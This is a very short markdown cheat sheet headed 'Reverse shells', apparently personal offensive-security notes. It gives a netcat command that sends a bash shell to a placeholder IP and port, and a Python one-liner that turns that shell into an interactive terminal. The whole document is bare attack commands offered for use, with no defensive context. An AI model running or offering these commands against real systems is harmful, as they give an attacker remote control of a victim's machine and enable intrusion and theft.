# Reverse shells
```
nc -e /bin/bash ip port
```

Spawn interactive with python:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```